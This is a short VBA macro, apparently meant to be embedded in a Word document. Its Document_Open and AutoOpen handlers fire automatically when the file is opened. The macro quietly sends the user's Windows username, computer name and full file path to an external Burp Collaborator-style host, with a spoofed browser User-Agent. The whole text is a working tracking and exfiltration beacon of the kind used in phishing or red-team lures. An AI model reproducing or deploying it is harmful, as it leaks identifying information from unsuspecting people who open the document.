Sub Document_Open()
    http
End Sub

Sub AutoOpen()
    http
End Sub

Sub http()
    ' will generate a web request including the username, hostname, and document name in the request parameters
    Dim u As String
    u = "https://123456abcd.burpcollab.com/index.html?u=" + Environ$("username") + "&c=" + Environ$("computername") + "&d=" + ActiveDocument.FullName
    Dim WinHttpReq As Object
    Set WinHttpReq = CreateObject("WinHttp.WinHTTPRequest.5.1")
    WinHttpReq.Open "GET", u
    WinHttpReq.setRequestHeader "Accept-Encoding", "gzip,deflate,sdch,gps"
    WinHttpReq.setRequestHeader "User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36;z"
    WinHttpReq.send
End Sub